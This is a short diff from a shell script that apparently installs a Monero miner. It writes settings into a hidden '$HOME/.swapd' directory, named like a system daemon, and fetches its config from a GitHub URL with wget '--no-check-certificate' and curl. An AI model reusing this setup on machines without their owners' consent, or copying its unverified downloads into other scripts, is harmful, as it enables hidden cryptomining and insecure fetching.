@@ -274,7 +274,7 @@ sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 #}
 #EOL
 
-wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
 
 
